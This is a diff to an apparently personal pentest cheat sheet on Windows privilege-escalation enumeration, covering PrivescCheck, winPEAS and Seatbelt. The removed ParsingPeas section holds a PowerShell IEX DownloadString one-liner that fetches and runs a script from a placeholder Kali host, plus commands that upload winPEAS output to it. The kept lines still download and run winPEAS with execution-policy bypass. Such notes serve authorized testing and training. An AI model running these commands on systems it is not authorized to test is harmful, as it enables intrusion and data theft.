@@ -178,48 +178,7 @@ https://github.com/itm4n/PrivescCheck
 ```bash
 wget https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1
 
-powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report <PREFIX> -Format HTML"
-```
-
-#### ParsingPeas
-https://github.com/YuvalMil/ParsingPeas
-
-**On Kali Host**
-
-```shell
-git clone https://github.com/YuvalMil/ParsingPeas.git
-cd ParsingPeas
-./setup.sh              # Downloads LinPEAS/WinPEAS
-pip3 install -r requirements.txt
-python3 receiver.py     # Starts on http://0.0.0.0:8000
-```
-
-**On Target Machine**
-
-```powershell
-powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_KALI_IP:8000/wrapper-inline.ps1')"
-```
-
-Navigate to `http://YOUR_KALI_IP:8000` in your browser to view reports.
-
-If the one-liner fails:
-```powershell
-# On target (PowerShell)
-Invoke-WebRequest -Uri http://KALI_IP:8000/get-winpeas -OutFile $env:TEMP\wp.exe
-& "$env:TEMP\wp.exe" > $env:TEMP\out.txt
-
-# Transfer
-$hostname = $env:COMPUTERNAME
-Invoke-WebRequest -Uri http://KALI_IP:8000/upload `
-  -Method POST `
-  -Headers @{"X-Hostname"=$hostname; "X-Scan-Type"="winpeas"} `
-  -InFile $env:TEMP\out.txt
-```
-
-**Parse local files:**
-
-```shell
-python3 parser.py /path/to/peas_output.txt
+powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report PRIVCHECK -Format HTML"
 ```
 
 #### winPEAS
@@ -247,13 +206,17 @@ python3 -m http.server 80
 
 ```powershell
 # Cible : télécharger et exécuter
-iwr -uri http://<ip>/winPEASx64.exe -Outfile winPEAS.exe
-.\winPEAS.exe
+iwr -uri http://<ip>/winPEASx64.exe -Outfile winpeas.exe
 
-.\winpeas.exe > output.txt
-.\winpeas.exe | Tee-Object -FilePath output.txt
+.\winpeas.exe all > winpeas.txt
+.\winpeas.exe all | Tee-Object -FilePath winpeas.txt
 ```
 
+**Parse export**
+https://github.com/jsdlm/scripts/blob/main/privesc/peasParser.py
+```shell
+python3 peasParser.py winpeas.txt
+```
 #### Seatbelt
 https://github.com/GhostPack/Seatbelt.git
 
